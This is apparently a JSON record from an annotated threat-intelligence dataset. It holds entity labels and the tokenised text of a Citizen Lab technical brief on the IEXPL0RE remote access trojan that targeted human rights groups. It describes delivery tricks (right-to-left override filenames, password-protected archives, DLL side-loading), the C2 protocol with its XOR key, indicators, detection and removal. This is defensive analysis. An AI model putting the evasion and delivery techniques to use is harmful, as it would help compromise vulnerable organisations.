"type": "MD5", "name": "8268297c1b38832c03f1c671e0a54a78", "sent_id": 121, "pos": [4]}, {"old_id": "T30", "type": "Time", "name": "November 1 2011", "sent_id": 120, "pos": []}, {"old_id": "T31", "type": "Time", "name": "November 29 2011", "sent_id": 121, "pos": []}, {"old_id": "T32", "type": "File", "name": "C:\\Documents and Settings\\user\\Local Settings\\Temp\\31Atmp", "sent_id": 128, "pos": []}, {"old_id": "T33", "type": "File", "name": "C:\\Documents and Settings\\user\\Local Settings\\Temp\\perf6cd2e5e9dat", "sent_id": 129, "pos": []}, {"old_id": "T34", "type": "TrojanHorse", "name": "IEXPL0RE", "sent_id": 123, "pos": [11]}, {"old_id": "T35", "type": "File", "name": "C:\\WINDOWS\\system\\lockdat", "sent_id": 131, "pos": []}, {"old_id": "T36", "type": "File", "name": "C:\\WINDOWS\\system\\MSMAPI32SRG", "sent_id": 132, "pos": []}, {"old_id": "T37", "type": "File", "name": "C:\\WINDOWS\\system32\\STREAMSYS", "sent_id": 133, "pos": []}, {"old_id": "T38", "type": "TrojanHorse", "name": "IEXPL0RE", "sent_id": 134, "pos": [3]}, {"old_id": "T39", "type": "Country", "name": "China", "sent_id": 140, "pos": [6]}, {"old_id": "T40", "type": "TrojanHorse", "name": "IEXPL0RE", "sent_id": 138, "pos": [3]}, {"old_id": "T41", "type": "Obfuscation", "name": "0xCD", "sent_id": 149, "pos": [15]}, {"old_id": "T42", "type": "Indicator", "name": "updatemicrosoftcom", "sent_id": 166, "pos": []}, {"old_id": "T43", "type": "Malware", "name": "ContainerV2", "sent_id": 168, "pos": [3]}, {"old_id": "T44", "type": "CourseOfAction", "name": "network intrusion detection system", "sent_id": 219, "pos": [1, 4]}, {"old_id": "T45", "type": "TrojanHorse", "name": "IEXPL0RE RAT", "sent_id": 216, "pos": [5, 6]}], "labels": [{"old_id": "R1", "r": "P33", "h": 3, "t": 1, "evidence": [8]}, {"old_id": "R2", "r": "P33", "h": 3, "t": 2, "evidence": [8]}, {"old_id": "R3", "r": "P21", "h": 21, "t": 22, "evidence": []}, {"old_id": "R4", "r": "P21", "h": 20, "t": 22, "evidence": []}, {"old_id": "R5", "r": "P21", "h": 19, "t": 22, "evidence": []}, {"old_id": "R6", "r": "P21", "h": 18, "t": 22, "evidence": []}, {"old_id": "R7", "r": "P21", "h": 24, "t": 23, "evidence": []}, {"old_id": "R8", "r": "P21", "h": 25, "t": 23, "evidence": []}, {"old_id": "R9", "r": "P21", "h": 27, "t": 26, "evidence": []}, {"old_id": "R10", "r": "P21", "h": 28, "t": 26, "evidence": []}, {"old_id": "R11", "r": "P33", "h": 26, "t": 29, "evidence": [117, 118, 119, 120]}, {"old_id": "R12", "r": "P33", "h": 26, "t": 30, "evidence": [117, 118, 119, 120, 121]}, {"old_id": "R13", "r": "P21", "h": 31, "t": 33, "evidence": []}, {"old_id": "R14", "r": "P21", "h": 32, "t": 33, "evidence": []}, {"old_id": "R15", "r": "P21", "h": 34, "t": 37, "evidence": [131, 132, 133, 134]}, {"old_id": "R16", "r": "P21", "h": 35, "t": 37, "evidence": [132, 133, 134]}, {"old_id": "R17", "r": "P21", "h": 36, "t": 37, "evidence": [133, 134]}, {"old_id": "R18", "r": "P32", "h": 39, "t": 38, "evidence": [138, 139, 140]}, {"old_id": "R19", "r": "P21", "h": 41, "t": 42, "evidence": [166, 167, 168]}, {"old_id": "R20", "r": "P34", "h": 43, "t": 44, "evidence": []}], "title": ["inputs/txt/201209CitizenLabIEXPL0RERAT"], "sents": [["CITIZEN", "LAB", "TECHNICAL", "BRIEF"], ["001"], ["IEXPL0RE", "RAT"], ["BY", "SETH", "HARDY", "|", "AUGUST", "2012"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["1"], ["INTRODUCTION"], ["This", "report", "describes", "a", "remote", "access", "trojan", "(RAT)", "that", "three", "human", "rights-related", "organizations", "taking", "part", "in", "a", "Citizen", "Lab", "study", "on", "targeted", "cyber", "threats", "against", "human", "rights", "groups"], ["received", "via", "email", "in", "2011", "and", "at", "the", "end", "of", "2010", ".", "Here", "we", "refer", "to", "it", "as", "the", "IEXPL0RE", "RAT", ","], ["after", "the", "name", "of", "the", "launcher", "program", ".", "It", "was", "first", "called", "\u201cSharky", "RAT\u201d", "in", "Seth", "Hardy\u2019s", "talk", "at"], ["SecTor", "2011", ".", "Since", "then", "it", "has", "also", "been", "referred", "to", "as", "c0d0so0", "and", "possibly", "Backdoor", ".", "Briba."], ["A", "RAT", "is", "a", "program", "that", "allows", "a", "remote", "user", "full", "access", "to", "a", "computer", ".", "This", "type", "of", "program"], ["can", "be", "used", "for", "legitimate", "reasons", ".", "In", "these", "cases", ",", "RAT", "can", "also", "stand", "for", "remote", "administration"], ["tool", ".", "In", "the", "case", "of", "the", "IEXPL0RE", "RAT", ",", "the", "remote", "user", "has", "the", "ability", "to", "record", "user", "keystrokes"], ["(including", "passwords)", ",", "copy", "and", "delete", "files", ",", "download", "and", "run", "new", "programs", ",", "and", "even", "use", "the"], ["computer\u2019s", "microphone", "and", "camera", "to", "listen", "to", "and", "watch", "the", "user", "in", "real-time", "."], ["RATs", "are", "common", "in", "targeted", "malware", "attacks", "against", "human", "rights", "organizations", "and", "other"], ["NGOs", ".", "Targeted", "attacks", "with", "this", "sort", "of", "payload", "are", "often", "referred", "to", "as", "advanced", "persistent"], ["threats", "(APTs)", ".", "APTs", "differ", "from", "other", "traditional", "computer", "attacks", "in", "that", "they", "are", "designed", "to"], ["be", "quiet", "and", "collect", "data", "over", "time", ",", "and", "act", "as", "a", "starting", "point", "for", "future", "tracking", "and", "compromise", "of", "targets", ".", "It", "is", "not", "uncommon", "for", "an", "APT", "infection", "to", "persist", "for", "months", "or", "even", "years", "after"], ["the", "malicious", "program", "is", "first", "run", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["2"], ["ATTACK", "VECTOR"], ["Attempted", "delivery", "of", "the", "malware", "was", "via", "email", "attachment", ",", "employing", "social", "engineering", "techniques", ".", "The", "emails", "that", "contained", "the", "attached", "IEXPL0RE", "RAT", "were", "different", "every", "time", ",", "with"], ["a", "unique", "email", "and", "delivery", "method", "used", "for", "each", "attempt", ",", "including", "multiple", "versions", "targeted"], ["at", "the", "same", "organization", ".", "Each", "email", "was", "tailored", "specifically", "for", "the", "target", ",", "both", "in", "terms", "of"], ["subject", ",", "content", ",", "and", "the", "way", "the", "RAT", "was", "attached", "and", "hidden", "."], ["Organization", "1:", "a", "human", "rights", "NGO", "received", "multiple", "emails", "with", "interesting", "keywords", "from"], ["senders", "claiming", "to", "be", "from", "personal", "friends", ".", "These", "emails", "included", "an", "executable", "attachment"], ["in", "a", "password-protected", "archive", ",", "which", "helps", "prevent", "detection", "by", "antivirus", "software", ".", "The", "password", "was", "included", "in", "the", "email", "address", "."], ["Organization", "2:", "a", "news", "organization", "operating", "a", "website", "that", "reports", "on", "developments", "in", "China", ","], ["received", "an", "email", "containing", "a", "story", "about", "a", "high-rise", "apartment", "building", "fire", ".", "Attached", "to", "the"], ["email", "were", "four", "images", "and", "two", "executable", "files", "(", ".", "scr", "extensions)", "designed", "to", "look", "like", "images"], ["using", "the", "Unicode", "right-to-left", "override", "character", ".", "When", "each", "executable", "file", "is", "run", ",", "it", "will", "install"], ["and", "launch", "the", "malware", ",", "drop", "an", "image", ",", "open", "the", "image", ",", "and", "delete", "itself", ".", "The", "end", "result", "is", "that"], ["only", "an", "image", "is", "left", ",", "making", "the", "email", "look", "more", "legitimate", "if", "the", "malware", "is", "run", "(figure", "1)", "."], ["FIGURE", "1:"], ["IMAGE", "OF", "A", "HIGH-RISE", "FIRE", "USED", "TO", "TRICK", "RECIPIENTS", "INTO", "RUNNING", "THE", "MALWARE", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["3"], ["Organization", "3:", "a", "Tibet-related", "organization", "received", "two", "emails", "with", "different", "versions", "of", "the"], ["malware", "attached", ".", "The", "first", "file", "was", "an", "executable", "file", "designed", "to", "appear", "as", "a", "video", "of", "a", "speech"], ["by", "the", "Dalai", "Lama", ",", "attached", "to", "an", "email", "about", "a", "year", "review", "of", "Tibetan", "human", "rights", "issues"], ["(figure", "2)", ".", "The", "second", "file", "was", "embedded", "in", "an", "Excel", "spreadsheet", "attached", "to", "an", "email", "pretending", "to", "be", "from", "a", "conference", "on", "climate", "change", "."], ["Emails", "that", "contain", "malicious", "attachments", "use", "a", "variety", "of", "social", "engineering", "techniques", "to"], ["appear", "more", "legitimate", ".", "Methods", "include", "using", "names", "of", "real", "people", "and", "organizations", ",", "choosing"], ["material", "that", "is", "directly", "related", "to", "the", "target\u2019s", "interests", ",", "and", "including", "chains", "of", "fake", "forwards", "to"], ["make", "it", "appear", "as", "if", "the", "email", "has", "been", "circulated", "."], ["Including", "the", "attachments", "in", "a", "RAR", "file", "makes", "them", "less", "likely", "to", "be", "discovered", "by", "an", "antivirus"], ["(AV)", "scanner", ".", "Putting", "a", "password", "on", "the", "archive", "and", "including", "it", "in", "the", "email", "reduces", "the", "chances", "of", "AV", "discovery", "even", "further", "."], ["FIGURE", "2:", "EXAMPLE", "TARGETED", "EMAIL", "WITH", "IEXPL0RE", "RAT", "USING", "SOCIAL", "ENGINEERING", "METHODS", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["4"], ["A", "newer", "version", "of", "the", "RAT", "payload", "was", "later", "distributed", "via", "email", "in", "multiple", "RTF", "documents"], ["to", "organization", "3", ".", "The", "RTF", "dropped", "a", "DLL", "alongside", "a", "legitimate", "program", "vulnerable", "to", "DLL", "injection", ",", "allowing", "the", "program", "to", "run", "without", "a", "warning", "that", "the", "program", "is", "not", "digitally", "signed", "."], ["StrokeIt", ",", "a", "program", "for", "using", "mouse", "gestures", ",", "uses", "a", "file", "named", "config", ".", "dll", "without", "verifying", "the"], ["authenticity", "of", "the", "file", ".", "By", "replacing", "config", ".", "dll", "with", "the", "RAT", "downloader", ",", "the", "malicious", "code", "is"], ["run", "while", "appearing", "more", "legitimate", "to", "the", "operating", "system", "(figure", "3)", "."], ["FIGURE", "3:"], ["VALID", "DIGITAL", "SIGNATURE", "FOR", "THE", "STROKEIT", "PROGRAM", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["5"], ["MALWARE"], ["The", "IEXPL0RE", "RAT", "is", "delivered", "inside", "an", "executable", "program", "or", "document", ",", "which", "is", "customgenerated", "for", "each", "email", ".", "When", "a", "user", "opens", "the", "document", "or", "runs", "the", "program", ",", "it", "installs", "a"], ["launcher", "program", "on", "the", "computer", ".", "Antivirus", "programs", "frequently", "fail", "to", "detect", "the", "launcher"], ["program", "as", "malicious", ",", "as", "it", "is", "custom", "built", "for", "each", "specific", "target:", "the", "file", "contains", "a", "configuration", "file", "unique", "to", "the", "target", ",", "which", "is", "different", "each", "time", "it", "is", "sent", "out", ".", "This", "method", "is", "used", "to"], ["defeat", "signature-based", "antivirus", "programs", ",", "which", "only", "scan", "for", "files", "that", "are", "known", "to", "be", "malicious", ".", "As", "the", "launcher", "program", "is", "newly", "generated", "every", "time", ",", "it", "will", "never", "end", "up", "on", "a", "signature", "list", "until", "after", "it", "is", "already", "been", "used", "."], ["Once", "installed", "on", "a", "system", ",", "the", "launcher", "program", "goes", "through", "multiple", "programs", "to", "unpack", "a"], ["contained", "file", "(the", "actual", "RAT)", "before", "it", "can", "run", ".", "The", "IEXPL0RE", ".", "EXE", "(or", "other", "launcher)", "program", "contains", "multiple", "programs", ",", "layered", "like", "an", "onion", ",", "which", "eventually", "unpack", "a", "DLL", "(dynamic", "link", "library", ",", "another", "form", "of", "executable", "file)", ".", "The", "file", "name", "varies", ",", "but", "starts", "with", "\u201cperf\u201d"], ["and", "has", "an", "extension", "of", "", ".", "dat,", "and", "is", "saved", "to", "the", "%temp%", "folder", "(often", "C:\\Documents", "and", "Settings\\user\\Local", "Settings\\Temp)", "."], ["Once", "the", "perf*", ".", "dat", "file", "is", "saved", "to", "disk", ",", "it", "runs", "(via", "injection", "into", "svchost", ".", "exe,", "a", "Windows", "program)", "and"], ["extracts", "another", "DLL", "into", "memory", ".", "This", "program", "is", "called", "\u201cContainerV2", ",", "\u201d", "as", "it", "is", "referenced", "from", "within"], ["the", "program", ",", "although", "it", "is", "never", "written", "to", "the", "disk", ".", "ContainerV2", "connects", "to", "the", "Internet", "and", "downloads", "another", "DLL", "called", "\u201cclient\u201d", ".", "The", "client", "is", "also", "kept", "in", "memory", "and", "never", "written", "to", "the", "disk", ".", "Once"], ["downloaded", ",", "ContainerV2", "will", "run", "the", "client", ",", "which", "does", "all", "of", "the", "IEXPL0RE", "RAT", "work", "(figure", "4)", "."], ["FIGURE", "4:", "STRUCTURE", "OF", "THE", "RAT", "LAUNCHER", "PROGRAM", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["6"], ["For", "Organization", "1", ",", "the", "executable", "launch", "process", "looks", "like", "this:"], ["\u2022\u2022"], ["", ".", "exe(attached", "file", ",", "launcher):", "appears", "as", "a", "text", "document;", "when", "run", ",", "displays", "a", "fake", "error"], ["message", "saying", "the", "file", "can\u2019t", "be", "found", "(figure", "5)"], ["\u2022\u2022", "csv", ".", "exe", "(runs", "and", "exits", "quickly)"], ["\u2022\u2022", "360tray", ".", "exe", "(runs", "and", "exits", "quickly)"], ["\u2022\u2022", "svchost", ".", "exe", "(with", "injected", "perf*", ".", "dat", "code)"], ["\u2022\u2022", "ContainerV2", "(injected", "into", "svchost", ".", "exe)"], ["\u2022\u2022", "client", "(downloaded", "and", "run", "in", "memory)"], ["FIGURE", "5:"], ["SOCIAL", "ENGINEERING", "TECHNIQUE:", "A", "FAKE", "ERROR", "MESSAGE", "HIDING", "THE", "FACT", "THAT", "THIS", "IS", "A", "PROGRAM", "."], ["One", "advantage", "of", "downloading", "the", "final", "stage", "is", "that", "if", "the", "attacker", "wanted", "to", "update", "the", "RAT"], ["software", "(to", "add", "new", "functionality", "for", "example)", ",", "it", "can", "be", "done", "very", "easily", ".", "Because", "code", "is", "downloaded", "every", "time", "the", "malware", "starts", ",", "if", "the", "code", "is", "changed", "on", "the", "server", "side", ",", "existing", "compromised", "machines", "will", "automatically", "update", "themselves", "the", "next", "time", "they", "are", "restarted", ".", "Over", "the"], ["time", "spent", "analyzing", "this", "malware", ",", "the", "client", "program", "did", "have", "minor", "changes", ",", "possibly", "bug", "fixes", "."], ["MD5", "hashes", ",", "also", "called", "message", "digests", ",", "are", "often", "used", "to", "identify", "a", "file", "based", "on", "its", "content", "."], ["A", "hash", "is", "a", "string", "of", "hexadecimal", "characters", "that", "identifies", "a", "file", ".", "Should", "the", "file", "change", "in", "any"], ["way", ",", "the", "hash", "will", "as", "well", ".", "Hashes", "are", "designed", "to", "be", "easy", "to", "compute", "from", "a", "full", "file", ",", "but", "it", "is"], ["very", "difficult", "to", "find", "two", "files", "with", "the", "same", "hash", "."], ["Use", "of", "hashes", "in", "the", "context", "of", "the", "IEXPL0RE", "RAT", "is", "difficult", ",", "as", "the", "downloaded", "client", "may"], ["change", ",", "and", "the", "ContainerV2", "program", "is", "different", "for", "every", "target", ".", "One", "of", "the", "main", "differences"], ["that", "guarantees", "that", "the", "hash", "will", "always", "be", "unique", "is", "that", "the", "configuration", "file", "for", "the", "RAT"], ["(including", "which", "command", "and", "control", "servers", "to", "connect", "to)", "is", "included", "in", "the", "program", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["7"], ["For", "reference", "some", "MD5", "hashes", "of", "IEXPL0RE", "components", "include:"], ["ORIGINAL", "ATTACHMENT:"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["Organization", "1:", "d7c826ac94522416a0aecf5b7a5d2afe", "(EXE)"], ["Organization", "2:", "66e1aff355c29c6f39b21aedbbed2d5c", "(SCR)"], ["Organization", "3:", "21a1ee58e4b543d7f2fa3b4022506029", "(EXE)"], ["Organization", "3:", "8d4e42982060d884e2b7bd257727fd7c", "(XLS)"], ["CONTAINERV2:"], ["\u2022"], ["\u2022"], ["Organization", "1:", "d46d85777062afbcda02de68c063b877"], ["Organization", "2:", "85e8c6ddcfa7e289be14324abbb7378d"], ["ORGANIZATION", "2", "CLIENT", "(ONLY", "ACTIVE", "COMMAND", "AND", "CONTROL", "SERVER):"], ["\u2022"], ["\u2022"], ["November", "1", ",", "2011:", "eb51b384fcbbe468a6877f569021c5d1"], ["November", "29", ",", "2011:", "8268297c1b38832c03f1c671e0a54a78", "(current", "as", "of", "July", "20", ",", "2012)"], ["INFECTION"], ["Once", "the", "launcher", "program", "is", "run", ",", "it", "will", "install", "the", "IEXPL0RE", "binary", "and", "a", "startup", "link", "in", "the"], ["Start", "Menu:"], ["C:\\Documents", "and", "Settings\\All", "Users\\Start", "Menu\\Programs\\Startup\\IEXPL0RE", ".", "LNK"], ["C:\\Documents", "and", "Settings\\user\\Application", "Data\\Microsoft\\Internet", "Explorer\\IEXPL0RE", ".", "EXE"], ["It", "also", "leaves", "traces", "of", "the", "extracted", "binary", "and", "the", "link", "file", "(the", "", ".", "tmp", "file", "below)", "in", "%temp%:"], ["C:\\Documents", "and", "Settings\\user\\Local", "Settings\\Temp\\31A", ".", "tmp"], ["C:\\Documents", "and", "Settings\\user\\Local", "Settings\\Temp\\perf6cd2e5e9", ".", "dat"], ["The", "RAT", "also", "uses", "a", "few", "files", "for", "configuration", "and", "recording", "keystrokes:"], ["C:\\WINDOWS\\system\\lock", ".", "dat"], ["C:\\WINDOWS\\system\\MSMAPI32", ".", "SRG"], ["C:\\WINDOWS\\system32\\STREAM", ".", "SYS"], ["When", "run", ",", "IEXPL0RE", "will", "connect", "to", "a", "command", "and", "control", "(C2)", "server", "for", "updates", ",", "sending", "keylogger", "data", ",", "and", "asking", "for", "RAT", "commands", ".", "The", "C2", "server", "is", "specified", "in", "a", "configuration", "file", "built"], ["into", "the", "RAT", "program", ".", "Each", "RAT", "instance", "is", "likely", "built", "using", "a", "packaging", "program", ".", "The", "configuration", "file", "allows", "for", "a", "primary", "server", "and", "an", "alternate", ",", "and", "may", "use", "either", "a", "domain", "or", "IP", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["8"], ["Each", "of", "the", "IEXPL0RE", "samples", "analyzed", "uses", "a", "different", "set", "of", "C2", "servers", ".", "One", "sample", "uses", "two"], ["domains", "that", "point", "to", "the", "same", "IP", ".", "The", "IP", "changes", "every", "few", "days", "to", "few", "weeks", ",", "but", "remains"], ["in", "one", "network", "block", "located", "in", "China", ".", "Other", "samples", "use", "either", "a", "single", "domain", "name", "and", "no"], ["backup", ",", "or", "a", "fixed", "IP", "with", "a", "localhost", "address", "as", "backup", ".", "The", "localhost", "address", "is", "a", "way", "to", "find"], ["and", "use", "a", "proxy", ",", "for", "example", ",", "if", "a", "computer", "is", "using", "a", "circumvention", "system", "such", "as", "Tor", ".", "Of", "the"], ["two", "samples", "using", "fixed", "IPs", ",", "both", "were", "sent", "to", "the", "same", "organization", ",", "and", "one", "appears", "to", "be", "a"], ["replacement", "for", "the", "other", ".", "Both", "C2", "servers", "are", "currently", "down", "."], ["C2", "COMMUNICATION"], ["IEXPL0RE", "has", "two", "different", "methods", "of", "communication:", "HTTP", "POST", "and", "GET", ".", "It", "also", "has", "the"], ["ability", "to", "use", "a", "HTTP", "CONNECT", "proxy", ".", "POST", "is", "the", "preferred", "method", "of", "communication;", "if", "it"], ["does", "not", "work", ",", "it", "will", "also", "attempt", "a", "GET", "connection", "."], ["All", "communication", "from", "the", "client", "to", "the", "server", "is", "encrypted", "with", "a", "one-byte", "XOR", "key", "0xCD", "."], ["(Information", "in", "this", "report", "shows", "the", "data", "after", "decryption", ".", ")", "POST", "commands", "put", "the", "data", "in"], ["the", "request", "body", ",", "while", "GET", "commands", "put", "the", "data", "in", "URL", "parameters", ".", "Server", "responses", "are"], ["all", "200", "OK", "messages", "with", "data", "in", "the", "body", "."], ["The", "system", "keeps", "track", "of", "the", "communication", "using", "a", "sequence", "number", ",", "which", "is", "part", "of", "the"], ["requested", "URL", ".", "The", "sequence", "number", "is", "nine", "digits", "long", ",", "starts", "at", "000000001", ",", "and", "generally"], ["increments", "by", "one", "for", "each", "packet", "sent", ".", "When", "authenticated", ",", "the", "sequence", "number", "jumps", "to"], ["000001000;", "if", "disconnected", ",", "the", "sequence", "number", "returns", "to", "the", "next", "sub-1000", "number", "expected", "."], ["THE", "HEADERS", "OF", "THE", "REQUEST", "LOOK", "LIKE", "THIS:"], ["POST", "/index000000001", ".", "asp", "HTTP/1", ".", "1"], ["Accept-Language:", "en-us"], ["User-Agent:", "Mozilla/4", ".", "0", "(compatible;", "MSIE", "7", ".", "0;", "Windows", "NT", "5", ".", "1;)"], ["Host:", "update", ".", "microsoft.com"], ["Connection:", "Keep-Alive"], ["Content-Type:", "text/html"], ["Content-Length:", "000041"], ["The", "Accept-Language", ",", "User-Agent", ",", "Connection", ",", "and", "Content-Type", "headers", "are", "always", "fixed", ".", "The"], ["Host", "header", "is", "also", "always", "fixed", "as", "update", ".", "microsoft.com;", "any", "requests", "to", "the", "C2", "server", "made"], ["without", "this", "header", "in", "place", "will", "be", "rejected", ",", "often", "with", "a", "redirect", "to", "Microsoft\u2019s", "website", "."], ["When", "run", ",", "ContainerV2", "communicates", "with", "the", "C2", "server", ",", "first", "establishing", "a", "socket", "by", "a", "three-way"], ["handshake", ".", "Below", ",", "the", "text", "at", "the", "start", "of", "the", "arrow", "indicates", "the", "packet", "type", ",", "sequence", "number", ",", "and"], ["connection", "socket", ".", "For", "example", ",", "\u201cPOST", "2", "(1)\u201d", "means", "that", "it", "is", "using", "an", "HTTP", "POST", "request", ",", "sequence"], ["number", "2", ",", "on", "the", "first", "established", "connection", "(figure", ".", "6)", ".", "The", "text", "on", "the", "line", "is", "the", "data", "in", "the", "packet"], ["after", "decryption", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["FIGURE", "6:"], ["9"], ["FIRST", "C2", "CONNECTION"], ["Once", "the", "first", "connection", "has", "been", "established", ",", "a", "second", "connection", "is", "made", "using", "a", "similar"], ["handshake", "(figure", "7)", "."], ["FIGURE", "7:"], ["SECOND", "C2", "CONNECTION"], ["When", "the", "second", "connection", "has", "been", "established", ",", "the", "ContainerV2", "program", "uses", "it", "to", "download"], ["the", "client", "and", "run", "it", "(figure", "8)", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["10"], ["FIGURE", "8:", "BINARY", "DOWNLOAD"], ["Once", "control", "has", "been", "handed", "off", "to", "the", "client", ",", "one", "connection", "is", "used", "for", "sending", "keylogger", "data", "from"], ["the", "client", "to", "the", "server", ",", "and", "the", "other", "connection", "is", "used", "to", "request", "RAT", "commands", "from", "the", "server", "."], ["With", "the", "protocol", "reversed", "(see", "Appendix", "B", "for", "a", "full", "listing", "of", "commands)", ",", "it", "was", "straightforward", "to", "write", "a", "program", "that", "communicates", "with", "the", "C2", "server", ",", "downloads", "the", "client", ",", "and", "sends"], ["back", "commands", "as", "desired", ".", "The", "program", "maintains", "the", "two", "sockets", ",", "sending", "heartbeat/command"], ["request", "packets", "at", "a", "specified", "interval", ",", "while", "sending", "back", "empty", "keylogger", "packets", "to", "trick", "the"], ["server", "into", "thinking", "the", "system", "is", "idle", "(figure", "9)", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["FIGURE", "9:", "AN", "EXAMPLE", "OF", "THE", "FAKE", "MALWARE", "CLIENT", "COMMUNICATING", "WITH", "THE", "C2", "SERVER", "."], ["11"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["12"], ["CAPABILITIES"], ["The", "IEXPL0RE", "RAT", "contains", "over", "40", "commands", "that", "an", "attacker", "can", "use", "to", "manipulate", "the"], ["file", "system", "and", "registry", ",", "download", "and", "run", "additional", "programs", ",", "and", "find", "and", "exfiltrate", "data", "."], ["An", "infected", "computer", "defaults", "to", "recording", "keystrokes", "and", "sending", "this", "data", "back", "to", "the", "server"], ["at", "regular", "intervals", ".", "The", "additional", "commands", "are", "there", "for", "interactive", "control", "of", "the", "system", "in"], ["real-time", "by", "an", "attacker", "."], ["This", "program", "is", "likely", "used", "in", "multiple", "phases", ".", "After", "infection", ",", "the", "keylogger", "records", "data", "including", "email", "addresses", "and", "passwords", ".", "Once", "an", "account\u2019s", "credentials", "have", "been", "captured", ",", "the"], ["attacker", "can", "log", "in", "and", "set", "up", "a", "forwarding", "address", "or", "download", "all", "of", "the", "data", "stored", "online", "."], ["Once", "a", "compromised", "machine", "has", "been", "determined", "useful", "by", "looking", "at", "the", "keylogger", "data", ",", "an"], ["attacker", "can", "use", "the", "RAT", "functionality", "to", "download", "files", "and", "install", "more", "specific", "malware", "-", "for"], ["example", ",", "a", "Skype", "plugin", "that", "records", "calls", "."], ["While", "post-infection", "behaviour", "from", "an", "attacker", "against", "a", "real", "target", "has", "not", "been", "observed", "in"], ["this", "investigation", ",", "this", "is", "a", "standard", "method", "in", "targeted", "attacks", "."], ["One", "particular", "area", "of", "interest", "with", "this", "RAT", "is", "that", "it", "contains", "a", "specific", "functionality", "for", "plugins", "relating", "to", "video", "and", "audio", "capture", ".", "Each", "time", "the", "malware", "connects", "to", "the", "command", "and"], ["control", "server", ",", "it", "sends", "a", "list", "of", "all", "video", "capture", "devices", "present", "on", "the", "computer", ".", "This", "behaviour", "may", "indicate", "that", "the", "attacker", "is", "specifically", "interested", "in", "seeing", "who", "is", "on", "the", "other", "end", "of"], ["the", "computer", ",", "and", "is", "actively", "collecting", "data", "on", "what", "the", "targets", "look", "like", "."], ["For", "a", "full", "list", "of", "the", "commands", "supported", "by", "IEXPL0RE", "and", "a", "description", "of", "what", "they", "do", ",", "see"], ["Appendix", "B:", "Command", "Enumeration", "."], ["DETECTION", "AND", "MITIGATION"], ["A", "system", "infected", "with", "the", "IEXPL0RE", "RAT", "can", "be", "found", "by", "looking", "for", "presence", "of", "the", "IEXPL0RE", "files", ",", "or", "by", "watching", "network", "traffic", "."], ["In", "addition", "to", "the", "IEXPL0RE", ".", "EXE", "file", "itself", ",", "presence", "of", "the", "perf*", ".", "dat", "files", "and", "link", "files", "in"], ["%temp%", "are", "an", "indicator", "that", "the", "system", "is", "infected", ".", "The", "timestamps", "on", "the", "files", "are", "an", "indication", "of", "how", "long", "the", "system", "has", "been", "infected", "."], ["A", "network", "intrusion", "detection", "system", "(IDS)", "can", "identify", "infected", "machines", "by", "looking", "for", "wellknown", "traffic", "patterns", ".", "The", "simplest", "of", "these", "is", "checking", "for", "HTTP", "traffic", "to", "/index[0-9]{9}", ".", "asp."], ["Blocking", "this", "traffic", "will", "prevent", "the", "infected", "machine", "from", "communicating", "with", "the", "C2", "server", ","], ["receiving", "new", "commands", ",", "and", "sending", "back", "keylogger", "data", "."], ["The", "C2", "IP", "or", "hostname", "can", "also", "be", "blocked", "directly", "once", "it\u2019s", "found", ",", "at", "the", "network", "level", "or", "(as", "a"], ["temporary", "measure)", "in", "the", "infected", "computer\u2019s", "hosts", "file", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["13"], ["REMOVAL"], ["A", "running", "copy", "of", "IEXPL0RE", "can", "be", "stopped", "by", "killing", "the", "appropriate", "svchost", "process", ".", "This"], ["process", "is", "identifiable", "as", "it", "is", "not", "in", "the", "correct", "place", "in", "the", "process", "tree", ".", "In", "figure", "10", ",", "this", "is", "the"], ["last", "process", "in", "the", "list", ",", "PID", "1256:"], ["FIGURE", "10:", "PROCESS", "EXPLORER", "SHOWING", "THE", "INFECTED", "SVCHOST", ".", "EXE", "PROCESS", "(1256)", "."], ["The", "process", "can", "be", "killed", "with", "the", "Process", "Explorer", "tool", ",", "part", "of", "the", "Sysinternals", "package"], ["(figure", "10)", "."], ["Once", "the", "process", "has", "been", "terminated", ",", "removal", "is", "as", "simple", "as", "deleting", "the", "installed", "files", "(see"], ["the", "section", "on", "Infection", "above", "for", "a", "list)", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["14"], ["CONCLUSIONS"], ["The", "IEXPL0RE", "RAT", "is", "a", "good", "example", "of", "the", "current", "state", "of", "APT", "attacks", ",", "especially", "those", "targeting", "human", "rights", "organizations", "and", "NGOs", ".", "While", "they", "are", "not", "particularly", "advanced", "from", "a"], ["technical", "standpoint", ",", "they", "are", "custom", "designed", "to", "appeal", "to", "and", "pique", "the", "interest", "of", "the", "recipient", "."], ["The", "attacker", "uses", "social", "engineering", "to", "get", "a", "foot", "in", "the", "door", "of", "an", "organization", ".", "All", "it", "takes", "is"], ["for", "one", "user", "to", "run", "a", "malicious", "program", "that", "looks", "like", "a", "legitimate", "video", ",", "spreadsheet", ",", "or", "other"], ["document", ".", "Once", "running", "on", "a", "user\u2019s", "machine", ",", "the", "program", "will", "silently", "record", "passwords", "and"], ["provide", "the", "attacker", "a", "way", "of", "accessing", "sensitive", "data", "."], ["This", "report", "describes", "what", "is", "\u201cnormal\u201d", "in", "this", "area", ",", "by", "detailing", "what", "a", "common", "attack", "looks", "like"], ["at", "each", "step", "of", "the", "way", ",", "from", "when", "an", "email", "is", "first", "received", "to", "when", "data", "leaves", "the", "network", "."], ["Many", "APT", "campaigns", "like", "the", "one", "presented", "in", "this", "report", "exist", "and", "continue", "to", 